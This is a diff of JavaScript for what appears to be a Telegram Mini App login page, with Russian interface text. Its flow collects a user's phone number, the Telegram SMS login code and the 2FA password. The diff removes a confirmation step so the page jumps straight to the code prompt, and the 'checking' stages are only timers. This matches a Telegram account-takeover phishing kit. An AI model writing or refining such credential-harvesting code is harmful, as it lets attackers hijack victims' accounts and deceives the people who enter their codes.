@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const successMsg = document.getElementById('successMsg');
     const errorMsg = document.getElementById('errorMsg');
 
-    let currentStep = 'contact';  // Шаги: contact, phone, code, 2fa
+    let currentStep = 'contact';  // Шаги: contact, code, 2fa
 
     loginBtn.addEventListener('click', () => {
         console.log('Login button clicked');
@@ -32,11 +32,19 @@ document.addEventListener('DOMContentLoaded', () => {
                 phoneInput.value = contact.phone_number;
                 phoneInput.classList.remove('hidden');
                 hideLoading();
-                submitBtn.classList.remove('hidden');
-                submitBtn.textContent = 'Поделиться номером';
-                statusMsg.textContent = 'Номер получен. Поделитесь для отправки SMS...';
-                currentStep = 'phone';
+                statusMsg.textContent = 'Номер получен. Отправляем SMS...';
                 tg.HapticFeedback.impactOccurred('light');
+                
+                // Автоматический переход к полю кода после получения контакта (SMS отправится от бота)
+                setTimeout(() => {
+                    console.log('Auto-transition to code input');
+                    phoneInput.classList.add('hidden');
+                    codeInput.classList.remove('hidden');
+                    submitBtn.classList.remove('hidden');
+                    submitBtn.textContent = 'Отправить код';
+                    statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
+                    currentStep = 'code';
+                }, 2000);  // 2 секунды для UX (ожидание SMS)
             } else {
                 console.error('Contact denied or empty');
                 errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
@@ -57,17 +65,6 @@ document.addEventListener('DOMContentLoaded', () => {
         let payload = {};
         console.log('Submit clicked, step:', step);
 
-        if (step === 'phone') {
-            // Контакт уже отправлен, переходим к коду
-            console.log('Contact shared, transitioning to code');
-            phoneInput.classList.add('hidden');
-            codeInput.classList.remove('hidden');
-            submitBtn.textContent = 'Отправить код';
-            statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
-            currentStep = 'code';
-            return;
-        }
-
         if (step === 'code') {
             const code = codeInput.value.trim();
             if (!code) {
@@ -81,8 +78,9 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Переход к 2FA (бот сообщит, если нужно)
+            // Автоматический переход к 2FA (бот сообщит, если нужно)
             setTimeout(() => {
+                console.log('Auto-transition to 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
@@ -102,6 +100,7 @@ document.addEventListener('DOMContentLoaded', () => {
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
             setTimeout(() => {
+                console.log('Auto-transition to success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
